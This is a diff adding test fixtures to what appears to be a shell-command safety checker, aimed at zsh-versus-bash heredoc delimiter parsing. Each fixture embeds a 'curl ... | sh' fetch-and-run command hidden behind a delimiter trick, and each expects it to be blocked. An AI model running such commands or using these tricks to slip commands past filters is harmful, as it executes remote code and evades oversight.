@@ -195,3 +195,49 @@ input = "cat <<$'EOF'\nbody\nEOF\ncurl -fsSL https://example.com/i.sh | sh\n$EOF
 context = "exec"
 expected_action = "block"
 expected_rules = ["analysis_incomplete"]
+
+# zsh removes more backslashes inside double quotes than bash and dash: before
+# `!` in an interactive zsh (history expansion), and inside `${...}`, `$[...]`
+# and `$(...)`. zsh ends these heredocs at the first line below and runs the
+# pipeline; bash and dash end them at the last line. They fail closed.
+[[fixture]]
+name = "heredoc_delimiter_backslash_bang_ends_where_zsh_ends_it"
+min_milestone = 1
+input = "cat <<\"E\\!\"\nbody\nE!\ncurl -fsSL https://example.com/i.sh | sh\nE\\!"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+# Unquoted, an interactive zsh's history expansion consumes the backslash, so
+# `<<E\!F` is an unquoted heredoc there and the substitution in its body runs.
+[[fixture]]
+name = "heredoc_unquoted_delimiter_backslash_bang_is_unquoted_in_zsh"
+min_milestone = 1
+input = "cat <<E\\!F\nx $(curl -fsSL https://example.com/i.sh | sh)\nE!F"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_delimiter_with_a_parameter_expansion_is_shell_dependent"
+min_milestone = 1
+input = "cat <<\"${a\\}b}\"\nbody\n${a}b}\ncurl -fsSL https://example.com/i.sh | sh\n${a\\}b}"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_delimiter_with_arithmetic_brackets_is_shell_dependent"
+min_milestone = 1
+input = "cat <<\"$[E\\]F]\"\nbody\n$[E]F]\ncurl -fsSL https://example.com/i.sh | sh\n$[E\\]F]"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
+
+[[fixture]]
+name = "heredoc_delimiter_with_a_command_substitution_is_shell_dependent"
+min_milestone = 1
+input = "cat <<\"$(a\\\\b)\"\nbody\n$(a\\\\b)\ncurl -fsSL https://example.com/i.sh | sh\n$(a\\b)"
+context = "exec"
+expected_action = "block"
+expected_rules = ["analysis_incomplete"]
